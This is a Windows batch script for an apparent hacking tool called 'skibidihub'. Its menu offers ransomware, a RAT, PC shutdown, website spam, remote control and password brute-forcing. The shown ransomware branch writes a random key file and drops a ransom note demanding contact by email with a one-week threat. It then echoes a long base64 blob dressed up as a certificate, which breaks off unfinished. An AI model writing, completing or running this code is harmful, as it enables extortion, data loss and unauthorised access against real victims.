@echo off
title skibidihub dsc.gg/disscordserver
mode 90,20
chcp 65001>nul
setlocal
"%windir%\System32\net.exe" session > nul 2>&1
if not "%errorlevel%"=="0" goto "NotAdministrator"
goto "Start"

:"NotAdministrator"
echo. [31m
echo   ██████  ██ ▄█▀ ██▓ ▄▄▄▄    ██▓▓█████▄  ██▓      ▄████▄   ▄████▄  
echo ▒██    ▒  ██▄█▒ ▓██▒▓█████▄ ▓██▒▒██▀ ██▌▓██▒     ▒██▀ ▀█  ▒██▀ ▀█  
echo ░ ▓██▄   ▓███▄░ ▒██▒▒██▒ ▄██▒██▒░██   █▌▒██▒     ▒▓█    ▄ ▒▓█    ▄ 
echo   ▒   ██▒▓██ █▄ ░██░▒██░█▀  ░██░░▓█▄   ▌░██░     ▒▓▓▄ ▄██▒▒▓▓▄ ▄██▒
echo ▒██████▒▒▒██▒ █▄░██░░▓█  ▀█▓░██░░▒████▓ ░██░ ██▓ ▒ ▓███▀ ░▒ ▓███▀ ░
echo ▒ ▒▓▒ ▒ ░▒ ▒▒ ▓▒░▓  ░▒▓███▀▒░▓   ▒▒▓  ▒ ░▓   ▒▓▒ ░ ░▒ ▒  ░░ ░▒ ▒  ░
echo ░ ░▒  ░ ░░ ░▒ ▒░ ▒ ░▒░▒   ░  ▒ ░ ░ ▒  ▒  ▒ ░ ░▒    ░  ▒     ░  ▒   
echo ░  ░  ░  ░ ░░ ░  ▒ ░ ░    ░  ▒ ░ ░ ░  ░  ▒ ░ ░   ░        ░        
echo       ░  ░  ░    ░   ░       ░     ░     ░    ░  ░ ░      ░ ░      
echo                           ░      ░            ░  ░        ░        
echo RUN THIS FILE AS ADMIN.
pause > nul 2>&1
goto exit

:"Start"         
cls 
echo. [31m
echo   ██████  ██ ▄█▀ ██▓ ▄▄▄▄    ██▓▓█████▄  ██▓      ▄████▄   ▄████▄  
echo ▒██    ▒  ██▄█▒ ▓██▒▓█████▄ ▓██▒▒██▀ ██▌▓██▒     ▒██▀ ▀█  ▒██▀ ▀█  
echo ░ ▓██▄   ▓███▄░ ▒██▒▒██▒ ▄██▒██▒░██   █▌▒██▒     ▒▓█    ▄ ▒▓█    ▄ 
echo   ▒   ██▒▓██ █▄ ░██░▒██░█▀  ░██░░▓█▄   ▌░██░     ▒▓▓▄ ▄██▒▒▓▓▄ ▄██▒
echo ▒██████▒▒▒██▒ █▄░██░░▓█  ▀█▓░██░░▒████▓ ░██░ ██▓ ▒ ▓███▀ ░▒ ▓███▀ ░
echo ▒ ▒▓▒ ▒ ░▒ ▒▒ ▓▒░▓  ░▒▓███▀▒░▓   ▒▒▓  ▒ ░▓   ▒▓▒ ░ ░▒ ▒  ░░ ░▒ ▒  ░
echo ░ ░▒  ░ ░░ ░▒ ▒░ ▒ ░▒░▒   ░  ▒ ░ ░ ▒  ▒  ▒ ░ ░▒    ░  ▒     ░  ▒   
echo ░  ░  ░  ░ ░░ ░  ▒ ░ ░    ░  ▒ ░ ░ ░  ░  ▒ ░ ░   ░        ░        
echo       ░  ░  ░    ░   ░       ░     ░     ░    ░  ░ ░      ░ ░      
echo                           ░      ░            ░  ░        ░        
echo  ├─ [91mskibidi.[31m ┌───────────────┐         ┌─────────┐                      ┌───────┐
echo  └─┬─────────┤  [91mEXPLOTE PC[31m   ├───┬─────┤ [91mhacking[31m ├──────────────┬───────┤ [91mother[31m ├────────
echo    │         └───────────────┘   │     └─────────┘              │       └───────┘
echo    ├─[91m{1}RANSOMWARE      [[92mI[91m][31m      ├─[91m{6}REMOTE CONTROLL PC   [[92mI[91m][31m  ├─[94m{11}discord[31m
echo    ├─[91m{2}SHURDOWN PC     [[92mI[91m][31m      ├─[91m{7}BRUTEFORCE PC PASS   [[92mI[91m][31m  └─[37m{22}exit[31m
echo    ├─[91m{3}RAT             [[92mI[91m][31m      └─[91m{8}BRUTEFORCE WIFI PASS [[92mI[91m][31m                           
echo    ├─[91m{4}SPAM WEBSITE    [[92mI[91m][31m
echo    └─[91m{5}MID KILL PC     [[92mI[91m][31m
set /p selected=.──type the number─»[38;2;255;255;0m
if /I %selected% EQU 1 goto ransomware
if /I %selected% EQU 2 goto shutdownpc
if /I %selected% EQU 3 goto rat
if /I %selected% EQU 4 goto spamurl
if /I %selected% EQU 5 goto midkill
if /I %selected% EQU 6 goto rpc
if /I %selected% EQU 7 goto brutf
if /I %selected% EQU 8 goto brutfwif
if /I %selected% EQU 11 goto discord
if /I %selected% EQU 22 goto exit
pause >nul
exit

:ransomware
color c
MODE CON: COLS=100 LINES=25
if exist Encrypt.sk (goto Crypt) else (goto Encrypt)

:Encrypt
MODE CON: COLS=100 LINES=25
set temp_ubication=%cd%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>Encrypt.sk
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>Encrypt.sk
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>Encrypt.sk
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>Encrypt.sk
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>Encrypt.sk
echo off>>README.txt
echo Oops... Your Files Have Been Encrypted!>>README.txt
echo.>>README.txt
echo Please Read This Text Document Carefully and Follow>>README.txt
echo all the steps outlined in this document if you want to recover your Files>>README.txt
echo.>>README.txt
echo 1. Open your Web Browser or Email Account>>README.txt
echo.>>README.txt
echo 2. Write a Decryption Request to the Following Email Address: dharkonsk@gmail.com>>README.txt
echo.>>README.txt
echo 3. Enter the Code You Received by Email into the Decryptor>>README.txt
echo.>>README.txt
echo You must know that if you do not Pay within 1 week, You will Lose your Files Forever>>README.txt
echo Do not take the risk, Pay immediately and recover your Files>>README.txt

(
echo -----BEGIN CERTIFICATE-----
echo R0lGODlhtwOjAXAAACH5BAEAADQALAAAAAC3A6MBhQwMDA0NG4U/VqciDec/NDsN
echo DQ0iP2E2Vuc2KOdIVudIP2ENDcctGw0YNMdIVjstS8ctKIU/S4UYDaciKKdIVudI
echo Sw0NKKciG8dIS8dIP6dIS6dIP2E2S2EYNMc/NIUiNDsiP+c2NIUYG8c/S2EiP2EN
echo KKc/NDsNKMc2P4U2S6ctKDstP+c/P6c/Vqc/P6c2NDsNG8c/PzsYNMc2KAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaPQIBwSCwaj8ikcslsOp/Q
echo qHRKrVqv2Kx2y+16v+CweEwum8/otHrNbrvf8Lh8Tq/b7/i8fs/v+/+AgYKDhIWG
echo h4iJiouMjY6PkJGSk5SVlpeYmZqbnJ2en6ChoqOkpaanqKmqq6ytrq+wsbKztLW2
echo t7i5uru8vb6/wMHCw8TFxsfIycrLzM3Oz9DR0tPU1dZB19jZ2tvc3d7f4OHi4+Tl
echo 5ufo6err7O3u7/Dx8vP09fb3+Pn6+/z9/v8AAwocSLCgwYMIEypcyLChw4cQI0qc
echo SLE2osWLGDNq3Mixo8ePIEOKHEmypMmTKFOqXMmypcuXMGPKnEmzps2bOHPq3Mmz
echo p8+fQIMKHUq0LajRo0iTKl3KtKnTp1CjSp1KtarVq1izat3KtavXr2DDih1LtqzZ
echo s2jTql3Ltimt27dw48qdS7eu3bt48+rdy7ev37+AAwseTLiw4cOIEytezLix48eQ
echo IyRLnky5suXLmDNr3sy5s+fPoEOLHk26tOnTqFOrXs26tevXsGMiy55Nu7bt27hz
echo 697Nu7fv38CDCx9OvLjx48iTK1/OvLnz5x7Qo0ufTr269evYs2vfzr279+/gw4sf
echo T768+fPo06seX8++vfv38OPLn0+/vv37+PPr38+/v///AAYo4IAE/xZo4IEIJqjg
echo gvClMAASKRBQwBgOohHhhEY0IOEcF36hIYZRHIAAg+ikkEACBCzA4YkJMLBFAw6E
echo AOITFgjwoBE1bhhGjTd2YeKJLgqR44xDGKDjEyCw2OIWQzJxQJBPGEmkEyKSaI4A
echo IQjxwJFuCDDDFyDMEIEEU9jYZY9beCmFlFE8MKIbT0bBphRxWjmOAQqoKISZKUxA
echo QQIKkCnEjwn0SCiaVVhAAaIAVAhAAzIOyiKjRPAIApRhJrmkEA2w6GKNE5gYqBCa
echo vvloBoI2gKqkKOrZ6KRJgCqqoAAccGKeg/oJKK04LmpEqUXYemKkr7aqBAimDtHn
echo n6Ny6impM/9oGiSwyuo6qqYsmipsikMImwCxP3LLaqFE1GlnOA9k2S0ENZKb7oTp
echo GhFvF7aiyaMQbM7LhAUZLDDnCigWoCqZBiTAKwACuJssskQIAAGpEtb4JQBbwqsu
echo Ewk/6CapNx4gY42jbpxEvUcw3O2bH0qsJZdFiDwEyGSKXPDBAEs48BAmA9CuxsSa
echo y7EQB2xY5aMRq0nxhvoGC+W53wwNtItmPrpBzOIOsaWrL55oatT5Vq3ECiM2MPXK
echo EypKps86c00sxcmu8LGZDXigpwVjX72v2kSyibcSnSaQLNsvjw2AlHHPLfgRAMOK
echo 8I0GRIr20WVTQKvLi3Mq+ONFRiw44XL/C1m31zgvzXQ3OdfKwL06C/6A1kSs7rcX
echo ir7NuI6u/21E1Ac8DAAIFw8RNRGOzgl44AsUPriOqNe+RPAbwshi0bNP2evaLquq
echo p5RzWuDoEZSnHX3lRfCOhMva32j200U4f6LN/eIrYfZRK9+66KNvk72vjlpfaQp/
echo a287FjfjGsv4lwT1DWtCYCuC9kSHOuGVrlYDMADK2pe6gxEQCQ3ckACClLLgrY1v
echo qyKVqfQHgBWwb26SS0L3yue+AizQCAksWbKiZjzTFWGD+JIRCU0oMArSjVf+q185
echo FBWkoLkQd7aLIRGUqCivNRFrS3hXrcLmAJZ1jwiNw9DNrrgCXDXsR3ta+psEOUAr
echo hwHtg8NDggBd6KsmTmiNTQDBkSiXgi8VTINFZBkRxHfD73URilfU0sVQ5zQ5gkhR
echo D3Jjo+wYMIQVEY1KRJgepoWIDUWtD0MJY92enlc2Qq1NUV4UEgVCeQQD6sh5CuiA
echo B97IyZFNbE8PCyS2PgXHTGpyT0eyZCPbdclYwbFggPrAKjMovUc5oJUIUxLKjhkC
echo Q+rsT41MQuKA5L0WkupZafSdMnVGqGTx8k3AVIAwJ+S8Zm5IlzqyZS6xVExKcoOF
echo RfmdOykiz6Cgbp4TuedQ6onPfvrznwANqEAHStCCGvSgCE2oQhc/ytCGOvShEI2o
echo RCdK0Ypa9KIYzahGN8rRjnr0oyB9D6TaCZDtXWGkTUApI1Q6CpZawaRMSAEaDQFT
echo Zc30CzIl/ylcCAU6OU1yEpi7Q1DJAE8sCE8JR4UT/aaQVFA0VQpFvdtPBRHVlwlg
echo qky6qk6zMNQmdDUm8AwaFKHwIU18dQ5nDQM/qVBWJrQVDml1K1Y38VYrrPUSd31E
echo XJGw15bQ0AFkyl/PDtgtZArrpuViUaQEi6HD6tSxuWLWwYwA2XE9CFu3rGwpQ2Ai
echo PzUrXCqCVGdHKajKLmtXu1PS61jV0yIcqrDfaqesUAu09Y01WIa1LWyjCdol9G1T
echo jK1tbCOLWsyutla6VYK3dKRZvip2QsFF7nCTcNpmFau11ZLsoG6kUs0ut7GEVa5u
echo Z9usS0nrmsfdHQPOq4TXNoq74FLcyP+Sa15qOoua5BUUtU6VqhD21rLHuqVoE+DZ
echo wFqLVv+t75KMq63kVpdMDIbt2txrEtQNjJhTBNqbhlbWoTntCByGnjU9/L+TaZib
echo BttdiU+c4Wx2S3QkTkLBBnCAQJnJjLt7X6FqLIIKxVh7Kc4Z2nDszPHZLsbUJZfJ
echo QNAxxLa4rEw+44RC/EbdFbmUKX4Z86a84REBGcLaEl2Ua+VkKrf4w5RFmYiPx2UW
echo H+HLKoYlxIoJ5MvKbsRdZnGH85yEMXsMuuRqAK6SxD5alY7QPZys1fq3ZRf3uckI
echo DNjNOmVBJS8sWSmwcqSIjLQVy7BIO1ZAjwdQ591t2sobQvTNbLj/R0jDLM7oKxef
echo A2kSRxnxvZz6mOAK98MW9vpRnXvz5jbE2F/XEEe77tzehJ2qzoGAlLH2XLNvy2Zk
echo aQ8CJBSbBKRk7RScLtkqWrbPsn24X5HS2MHG0bKHUNdKDZtIKXs3uRUdbd/B14Xg
echo Bl8W652+n/5aSuim9r+Jfe+AJwFv8z64+VJYbHAPHN/TTumae12xCg4hkhX/dcmg
echo TcNUQ1uu8Drn2NDWwLVhfNMPSvizqY04U3EbATU6XdTMlvCMX26p1vRgY5dm8JWv
echo hJerJaYBd0VCwh2TRdZNHwUBvsahJ50ITpcAhkt59FsJSn71jjoSPhQvh73VRlLq
echo Orarvqup/4/7SDVtnSa1rsbvmbKYRW9e1U/Ywn1vl7qIEjrZA2V20b1960u32d7p
echo HfcjRo/t6o6e3XH95plPTe9KClThEZ+hub9x4TErMeXc9gT5TR3rW7e8o2sKxzC6
echo u3jtW3z8bqmE6kloY3Vk/A9Vr7H/oe3tfYf64LXEepPwc40a5xQF3QbxlAbbmcAv
echo d6yUDz6Xupvegwrz85vw8gWS0GxSAlvMg393NmfdhymMqZeZ3/jovfBRiK2hM72d
echo wx7qyZDXD7+66Zf8yTaa1criYPqDTXzub/34GmR+5HcEWxZ/0Jc/7VN/Sqcn/TeA
echo RsB+bIY6FFdipUNrsXJB96csngaBbP/yQDGnQKXnYgcQQROEQhbkaSKUOQXgJttH
echo Q/1igI6Gf4MSJPtWej7jf8CDgh1RVRkGI0JjO5k2OI2EZgf3MHfUZj7YZl7FaGAE
echo Yp7mMrwzI0R4BGE3ImoShGRWAFXoSC1mVdylI1eGMLrzZ00gMlNIgObXRhQwVWZ0
echo hA2ghsRmhI2EQ1nYZ9BWJUnYhULScRhyZYj0TGwohz/oBG04hFQ0iHfDOJv2SHSG
echo RCeWh0QYhEeoh7ECh5d3RqTSO63TOw8UR+qCh1VEJBb4h4qUNKQCbRnIR0WCAAcg
echo KNozMWTYOjroMtyWJTjkiFxYh6q4R59kiSXXh1xyhqaHEvyESh34MAOdlC2cckwE
echo EIUo1nvpw4zOZIzI+IzphSPdtCdNiI3KCGThtUlBl41IUIXX9ky9RI7s543foo3W
echo 9Ixvgk6y5UkYoo4rZmEbEk7jVEDSeI+3ko/O04znBE1zNUvLCCjHmIzDwo7e5474
echo 0o+rpI8o4oz0yDf7SE7HlErVOJEKZ03wqAS2NEIXeZDWuEwRGSkaOY4OeUTKKASR
echo ZI2rZYGuhUzGOEzyiFQpCWvh8yzEpI7pxU4vA00mWZMHt03oKHMraY7RRGuZBE4p
echo CU/Z8yPvmI3q6GRU8VR+YZVowIMQkVeYsXiC4ZVtwJULoZWagZV8YZZmoE8SIZb/
echo IdWWbvmWcBmXopB2jUKVbdBulECXaoCXd3l0OFcGzkcFekmAAwmNrrBfq5BTJzVX
echo VtFX+0MpTWIHYNkHjqlllLIGaHkGf/gGmbkvgwmCdpmChFCZXdCJpxCZVTCZW0Ga
echo CgkIfLkHrAk+cKCaa3Bsd8mYTcCWVGCafhCbWsCbwNCZUhFhwsUtA1Zg+YVef2Na
echo B9Zezcl43fWN3yVcdukti3Vv1PlY3/haxCld2JU2oUJb0UVhvwUl26InD7ZbOvJf
echo EIKd6VmcLCd8UJRg60VNx0la8LkE0yld1TleAhCe5VWfm4KYCrY03cOeFAYhyYUE
echo BSphIMKdqtVgxgKdkdKg//mpXuw1jMqyoAnqBO/Jn30ooFDCngT4nNcVn++JmCBK
echo KhCQoft5ngXEWQSGn97pKh1aE2jjZzIyYzxWISaScqFUOj9mImB2gUp2Z96HZEPD
echo JkjGV2pmeHjmZk7IYoGUo5A2lEC6APBUVlckaAejo0d0LXxWVkYTho/pawJwLeoC
echo pgyqWtzCaROiaqjCo6JWIWzqpFFKieFzpT/6KIMmaSGEk6lVaDjTO3BKMZpYhHPW
echo Z4B6NrNme2LmanBUM4m2O1dKqatmag2DahaTKH3qjEgmp2RyqG9GpLBGqtxoZyAi
echo pLPWqE+WaldKhaE2apYqZTF4E0OFPRJibQ4jgYfDRP/5tm63g3kUWnzApqW7pmsR
echo x2w5V3D5xqzHujsfN1SvKYEpBEc+Vy66M44E134Pl3Bt16zt128kdWw1F5Dbtqsw
echo B4Hs5m/Jaqy2WUAT9zllcziUY3O0okTnGp/yaTnQh689N61/ySaNhq9F0DX1mq8j
echo REHadjT86pHc9Xj5lnGSA65HgHAM64A0ZK+mYmzt40xm83Dkyq0F0G1+53EPGxO3
echo Z3lbeIvEqqFRN3WJJ22Qh3QSMHm7V0qBB6VsRnm6F3lXx3ori0xoSLOlh3U1hXtN
echo t7OLR5c7CUd/V0AUNDhrYybdk0UboyZRmyE767M/20szl0K0xnmLZmTtCiKrd43/
echo I9uav6KJbAd6Q3tJ9ggvtvN3tOZ6aHsjoOcE1nqzu9c9X3eZxNS0ghu2hnYxWmeK
echo hWdMRHuwMpK1XxK1e2sTaMOBO/p6MLdBvmpoHct8NORkCBhuAngwO6Q50Ad1AHiJ
echo EeiA00dd0gc8NOhvhqtvA+RldAi71oSx70d3z3SAiqi6BEuDVElCp2KCgspmLBiE
echo EBiY/VpCpuuhscuzE8igl2a2zXs+OSi1xmu9gXO6FySDjRK9tEu3CrS8qaZ5C7u9
echo GigF+SM3/vdAMNieLRS/RRutLNm5kwW/FGRI50eb6PgwHFi7OuGMopRIa6iFu2qL
echo UNNksihr5buNlYKLoIiImcAjiEqIMRbcg6Gop3iqQqbih5a4kWd2iKL4JtlawM+E
echo pASbwTgWi1OahEIXwgWUbrlIhoCLuQgzA6R4wNSVwcJYKSGMO2uaqBqKqAw6SFjo
echo wkV8O2PoZC3JwWWbiYekho5DwpoKxAaMNER8xdzUxCX8k99ZTSMsL5pYjnVYft5K
echo h0ocwR2TLJRDhFckiQGzwz/FdVaowzIcxf85sZQNGUyrlH22yC7iyJNRuZIheDtH
echo SY0IuVr/KJHiGHoRKXcGmZGPXKrdaEufBJV9LE7V2HiJzIyq5EJCmVr2hY8PCbUV
echo iZRY9Y+h7JSRYsrlOrWqjCFXi7kvBMsQ2YxBeZSy6scqeUtPbEur1ZKELEqENZUk
echo pUtUeUUTicwNo0m4PJPke7A36YGEEnRAucgfVGOne5Ia+cTKTFJw1JFDeUvCXMia
echo 1KWpjMtUaMvsB8vOfBdkqQbC2R0nHK58MM+8oZtlQJvhASMf98B+wM+2oZZtUM/q
echo QdBuYNBy2dAO/dAQHdGNoJiGwFIUfZeh2Qx02SFscNGy4NHUldF8I9L/fQDSYGDS
echo ZfCZQcF2qPkGMPKOrKuCe4ibYoDQxTJdqQAjJG2ZjbfTXNDSTvDS0qYFvqmg9pUF
echo QN14NC1jS824htkGSU1Zf9kEUd0FOj2PCv0TRU0GqoICZIK9S2DTXN3Urxh9qwAC
echo EDAmZXKZhaAqI/DV8ncFW31D23oICF1DKA2bU00HaK3W3dcUPqOikHWfo/KhJJpS
echo GUACn3I5C2qdcdp7zfWAzxld3pVbOI2NQSJFK3pfwOWeJlpZFlqjpCKiy6M44ylf
echo bXcpoZOh5Qmes6Kc7BZCq4agqE2AioOYH8q1HbDYgYWdm33TlxWho52hh43FIBZe
echo DbpqN6OirU3K6n9T3LgVXpENdQwbQppFYcypXZw9LaTt3MDTnN0Jo9sN28DjYCYK
echo BTai2q5NWyc63Ect3ipLP6x6YnQ6aqXmjKiK2CWwAcgKYVdqZqLJYsJ43yqMiEi2
echo Z1J6O59CAUU0plkmJFu2M6amhEOzOoTKphZeqdwL4d8Dk9TtL2DoqpQWk7W3RzPE
echo qWWdY9PMBLSWM3AGnKqy31oqOU5p4G9iivwmqmK4qM6FKKHqqnRIwIKKJ4pWOvkd
echo LE86xv83NziEZFc0pEGGMg9+TYQa4PfNXJFqqyP+Kyc+Zy+ug1wL4pikMNw0Mc6U
echo 4csdq/8w8Tjks2v9grWZK3OYZ7GIvQCXAta+9m56bHD4fD4NN20Px+fqpjgG9zhw
echo lD8SG3HEZ3FYhDQiB3333HwoW4bjd3WPDr6/qMdsA6UwGOkMGtCRJKwfjtY/9IsG
echo ZzdK0zLoSucZokmnjq4Trk9vXNcN3LwNC60A96xhDuHfFnH37LGiO65sfulF7Hil
echo 9ZcdhnPVA36j+rttUulinEUwuOjc95oqweYgCbS1uEiyNzW0R1b9YgEvcAJjY0A6
echo tLN67LV7aD6P13SDh7NAS11fwmG7V09PO+d/m6h/t4tR5OpH+9TK0jFBQrbAwygh
echo SPCpUzyd8+0UA/BW03vkc8gfLu7/J3Cth5ezcCtmbot2bP2TOvS3dcvftrmLdKmK
echo gQt41yN48a6zruJ1GL92g4dh/NTigzS74Pt3d4W39iazhNgxurNG347jW/sSj+Pi
echo ykeOmuuCqKe+dV4rfiJ1Aex+PI6TOFi/+qOAH86SykrV7AcjiaR851fwvta+/c3l
echo 5ctBG/LESxBEjJdU31t5ShIpK3S76z6uAQ40JHi9cd0oYM73td59tKk/BzABj5c/
echo z+u6L1YELUm/ICR1zGeaIyhBit+xdL9E6StKhDd8W+9W1e343gvtZxqB7IozJRZJ
echo ZM9vUR/24XP5vdv2Oz10H6Nznc5o+rdVJsHmvYNmgMyFjpji/7H4RCAUWijweFQM
echo XRlcxD/shQJuxZHow33fwlUsL3dIRSi3/PLSPyHs4SXziVb890Zgd8udqJGegVeL
echo AGTkO4zYMn1POao4tyj/KMPvqMZEwdzzwR+0Qkmc0c4Ex0TcAECA4EgAxeIDYQSA
echo FAulEWm0pCDFQ6jwVFIBhgQhe0hqtQ2P00IJWcdkQBQg1goGRQP43Xw+1mQ4wIKO
echo zQgES4qiLg1vRU/rb2rGCiuwDqABD5CCwMnNErMhg0iwC0+AwQrvrygtUTOrEzZW
echo dpa21vYWN1d3l7c37nQ1JWE4YWyKOOmuAARhiiEQ+XDY0OhAgajTDE2YyCtB4cMj
echo q8HhC/+klLg4OLpTgN2yXKFjJut4eIzc3NBe3S0QmFwiYfcIEQNYjkAHcdAIrmuo
echo ys4wcOLetIHF71M8hQX4USNzIFKwSCssFhx2ipIddO8ACMCUaRiejq/IzCwysOEo
echo ZW5AbUtAJJ88ivyS2DTirh8zLWli0ixTrqnDfiRruqSJtOESg0Ww9mOawCOZfCHO
echo 1cNZUkm+YZUAnW1LjBpRQDoxgdi6pCS/flhLIh3jbeIruyffsvuKiS5Na9jcHKhy
echo 9FlimGBfUX0COJxTX5s5d/b8GXRo0bZG0WLCaXSvKWxTt57D2nVs2bNp17Z9G3ft
echo 1bljneb9G3hw4cNB755FrhHx18p7fRln/hx6dOnTqT8pPRw56urbuXf3bh3296XX
echo xZMhXx59evXrhadk/x5+fPnz6de3fx9/fv37+ff3/x/AAAUckMACDTwQwQQVXJDB
echo Bh18EMIIb0khLCMu0Yy6wdD670LvNFTiw9A6tCWgBq65r8QTW6MQw9oaqFCXECWc
echo /5HGXl5scRe1+oHlAGB0CeQlJQyA0bMeQ1PqIqh2DM5IX4bEkSclv2GsliZ3QRLE
echo DTd78paAvMAGJ2oGI6wIcqjR0RgKgGGCiDET8LExOHmU08ufWgMSylyspGUnzrCs
echo EdBAZ+mTs55uIrIaOT0jNLQ9O/tTrDMOzZM2R3VhtEpFM+0FoopEG7EWUCQQdS5g
echo BBijEDJAmCEFbLSZtAEU6GlphDa1/EhTXJ8QldTvLI0FVF86FZTYYi2B8YBpFItJ
echo u10z4IQcbJKlTKt02piWmhQmoGDKImS0ghhMpt3kWGG2VRHbV7Tl9kQ3d0w3lmkR
echo cMqybJ4tM5SbmLVwK+NufP/RXArQVfambbt1t42ByOUx3FfgjVdOeMkBxpoFEDZC
echo 4WZVRQvScZ0AOIFzpd0X3KgAyPgWZ4pYwZB6laADBIDutSQUM1ptQIVWPZXl4olR
echo sTidJY/Ll2YqtcCpkm9PTqcSjzu5WN8vUJv2C3VJXnotnktCOeoEwtvCYBXjuBpp
echo jMkm5mslqDYkhUpuLBlRY+WWBVM54kC1aUQNLfXuQayIeAw5jrE1S7X/MgSEvAvw
echo YgBrRGi7774HxyvRJ+y2u7HALRo2rZkDqUKAx8rqQmyuKlGGccchv7wobij/2zrR
echo g7QcHzxYl2XP24vu9ZfYj4j7CLRUSVySxb1WvQ7i4zD/xO6dQvd2dlmeTyOkTnva
echo ae9/zAABAhAkECRVWhzllejedXl+iT7c4MONP6+4aU3F5/R9Cdv/KkX2LNivRRX0
echo R98/FsdIHuLkB8Cj5O8N6otX7TgiGd3NDYK0CJYFNuAqSaUlevhCTQqeUcEyXXBP
echo FLSgE3TikUd4kBSaQR0YmOEMEX6QhKejRghR+Kqa1PCCr7MXJ5yxtwZ40DFPMM4K
echo l9EMKryQZjG0wwzh5EMULgWFykCiDTthpSleEAQsaMFjYGchzz3RDS7zlpYupIwW
echo ckFIYEDik5xotABihS1uqkQUfgiUmbWEAXc4gQlecAJBrIBpEHNECLaotlwNyhDn
echo /1HCAxa2hzYYx3oZrJwXoVXBNWKhjW9opCz+kD0KEIGRGjOP28CYQk1qx5Og3KQ/
echo oqhGyHVhEjgUZQRpmUan6KhbOpJk9kyBS3Q1UUrXcA+hwpdElYxDSWBQRhRC50sJ
echo DFNcwExH6dISTMZwzkI5FMAMQCWIV77sdMoEA/uaaU1oOqyJL/mmszjBRmsKskzv
echo bEuQ9mSiVzhnfcKziC4XN84kbBMecCnA3lDnEUXCIgWRwFynXmmk7CW0AUkASUvq
echo gE0t/EoAYfkVLUTYgFnBQmnuGwP6+Dk/C72EDj5UpkHnmBWQqq+bLRWaEEeRBqAk
echo 8xUPaEhMj+DSMszMeeEcqP88a1nUywQJiVLg4BJx5MNQJNWQSoDqTYRqhHrtrSwq
echo g2U/C4CEf0z1ZFU13ypKyUo3jhFYMyMfDz/5D5oKVRkk+WpZX9mnenrukzzBohrL
echo alJA9JUZmBurMTNx1kXqcwvAIKJXubBUTwx0ZmVJpS1UFhC0VjMdmFRrKAxgkQNU
echo 9FYXVRQSBLtR8UHgASGZRQo259l3OJZLVWwiXkc1M0ZClq1GY60srkrbJ+zWH6/U
echo hlbfptQkZK+UwBXLzFjWQBlypK9Gle5jaSdERGRil/dKg+ZUpdG8jAJUquCCF9R4
echo XUVwNVWmiJwUwFsXeobWcPlMKxrUwJXHXCELvomvmbj/ysxTCHYuYh3dAYvXjiqQ
echo NwzwtRycAEy6BbCCEGFBH357o0BvqQ/C5zXjGkyRYVec7MBVa8l9gWceEuuvJLFd
echo aybWUMw4VAFSq9CEdgpxyyZA+MKUggUoUDBLP1ikmBYwQbM8LMkcK/XEIO6CiCdc
echo IYsGT6khofBhYTEKwZn3wyBaAyQKTOVOjFfEciCH/aZbZiFl1izswAxFxKIktsjl
echo KA3piOmOqRd8IGR0a+6vEVESJjqbsjDGcEsn4NyVW+nozdwSsbfuEpSNmJHPhdmL
echo 2+IykDSZLErmkMmg/SrpZHitTKCei5wVbWQ7c8VaEflGZuLajOfpOaAEGN1XSjye
echo jINUNB3/VW0P3bwyz55Cp3fJRHJQrQ7GhZotfsnFFOBrFEP3VM0SyUwslD2ZM+FZ
echo JoreR5igdOrJbFqghOa0njFyz1KnmWDZKAdZ8ODooXDazPGW97zpnZ+D5qJXOCbQ
echo vWuDqXr/G+ABF7h6btuZL+HLsP1xD3CCNXCHPxziEc+NXYi9GTcl3D/r5I2//yXe
echo cY9/HOQhF/nISV5yk58c5SlX+cpZ3nKXv1w5SptQrU9KExaJR+Ycojl0iivdnAOn
echo YtL5eXy+NXQb7RzmBIpxLfBUi9g2vTxLl6qSFFypQ5LIyG2eJsbjtJmGE4fbUa/6
echo kXJtuVXywrS8kPoWwuXj6cR47b3geNIVFHfQfB09Lo4UJ27OpKs7Peuy3UXaAa9j
echo 3BjnVGLHjd2L9HddPNk4Bzh7dTr15BwFnu7qKRvcdAyRh7XPpevqVslErLQGCNtp
echo Jwsb1+WlrtXH6x70gq9TwXS105NJuJgMQcAGRi3Vs6tNQUvY1RrTMM7jLmIE81kc
echo NgE1rE1ebeEem++xJv9q0aso9w5Ld/XT9mckZb9rbFlbFsA//bj1infyxRiltU99
echo nFif+I5AC06S8/nbv4mqZcKC8z9ffOrrsB3cJl9iZjB8hGuqD9QIkEymj1xARmRK
echo BvoK5wk6Zl8cUGBGRmqqwfiez+0yjzs65YGeRoFCsH0eyXWQpHle4k9Oz2iUB78C
echo oV1CS3cEIAZ5hLugYPYuyK38p93sRKng6ngU4HHq4HYmp5gchQehxG46hAR1pRpu
echo kHwYAwkRKHPKhMwiByKgIXnUyIFu0IAITRBS4px2Jr4eawybcAtER8GCrK6uUHfQ
echo KAlFcIf8Zgl9MBjEylHQ8An9BsouArwcgAgACQz/SCUO7QaN7GIQB7BplCkIh3AJ
echo 5AcWKg/IFCd1rgF85GcJ8Qd6DM8DhY7YrqgD6wUUY6F/nmuNXkIV0k6K6gpRpuhZ
echo hqkVZYkQZu+OqCCTLCUxIG0KIMAVlWirukiDyiS6ThG6Rgie/soYE6iQJikYLWEY
echo W6kYYWgJKu6VbCqs9C8aLUFSQmm1Xstt8EC/yAobdiL7RtENuITffA2csBEUjUMp
echo MimMAiktJGUUcREP4cQcoSgZAdANGsoQCs6m2sgdxwAg80pIsGCZjIiLrJBSOkXq
echo yggLGItO+GocE7GSuK4TqSPY7mzrSLENnKk3HikxVIomSvEpjE8ytI4YTiQl/09y
echo Ja+JFnnIFGLrGsnDPcrIn0bMmcZwsEBF47KpnQaRqLounjqSKzSqiTziJ6UxhUDy
echo DeSspixpJOVpI/0wabhQrKqSsKRoKo3yhkbloyJRJIUKJN/HrXhK/ZbrY97JJtsL
echo nTDrJTMtLvsQDN8BInhKcNQLAFjGJavmSdIrEkrqpeQPLqvmQtKrCviJoFbK5rov
echo I7tjt8AKpB4putLyGrdqbwrustpCURzrQnhSH4Wo/ELzx+YL4WzIprRqC+DKn+bK
